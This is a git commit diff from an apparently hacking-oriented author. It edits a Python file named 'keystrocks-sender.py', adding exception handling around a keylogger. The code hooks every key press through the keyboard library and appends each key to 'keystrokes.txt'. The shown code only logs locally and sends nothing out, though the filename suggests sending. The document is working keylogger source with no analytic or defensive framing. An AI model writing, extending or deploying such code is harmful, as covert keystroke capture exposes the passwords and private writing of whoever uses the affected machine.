9a1013739242b0ee2806fe4e745eb1b64a36adcb
tech-haxz <ranktopno1@gmail.com>
2024-07-08 14:02:35 +0530

    exception handled

--- keystrocks-sender.py
+++ keystrocks-sender.py
@@ -2,10 +2,14 @@ import keyboard
 
 log_file = 'keystrokes.txt'
 
-def on_key_press(event):
-    with open(log_file, 'a') as f:
-        f.write('{}\n'.format(event.name))
+try:
+    def on_key_press(event):
+        with open(log_file, 'a') as f:
+            f.write('{}\n'.format(event.name))
 
-keyboard.on_press(on_key_press)
+    keyboard.on_press(on_key_press)
 
-keyboard.wait()
+    keyboard.wait()
+
+except KeyboardInterrupt:
+    print('Exiting...')
